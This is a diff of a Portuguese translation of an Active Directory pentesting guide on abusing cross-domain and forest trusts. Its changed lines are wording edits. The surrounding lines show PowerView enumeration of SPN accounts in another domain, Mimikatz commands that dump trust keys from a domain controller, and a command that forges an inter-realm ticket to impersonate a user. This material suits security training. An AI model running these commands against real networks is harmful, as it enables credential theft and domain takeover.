@@ -62,7 +62,7 @@ Na enumeração anterior, foi encontrado que o usuário **`crossuser`** está de
 
 Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, você ainda pode voltar à Metodologia AD e tentar **privesc de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):
 
-Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain`, como em:
+Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain` como em:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -91,7 +91,7 @@ Se um usuário for migrado **de uma floresta para outra** e **o SID Filtering n�
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Você pode **assinar com** a chave **confiável** um **TGT impersonando** o usuário do domínio atual.
+Você poderia **assinar com** a chave **confiável** um **TGT se passando** pelo usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
